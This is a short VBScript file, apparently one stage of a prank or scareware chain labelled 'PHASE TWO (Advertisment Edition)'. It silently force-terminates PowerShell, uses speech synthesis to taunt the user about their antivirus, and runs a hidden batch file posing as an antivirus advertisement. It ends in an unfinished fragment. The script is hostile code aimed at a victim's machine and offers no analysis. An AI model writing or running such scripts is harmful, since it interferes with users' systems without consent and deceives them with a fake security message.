set shell = createobject("wscript.shell")
set sapi = createobject("sapi.spvoice")
on error resume next


' PHASE TWO (Advertisment Edition)
'-----------
shell.run "taskkill /im powershell.exe -f", 0
sapi.speak "uh oh, it appears that your anti virus sucks, dont have one? well you're in luck!"
shell.run "RunAntiVirusAd.bat", 0
'-----------
'TRANSITION
'shell.run "Bridge.bat", 0

wscript.quit

'@@@@@@@@@@@@@@
wscript.sleep 
shell.sendkeys ""
'@@@@@@@@@@@@@@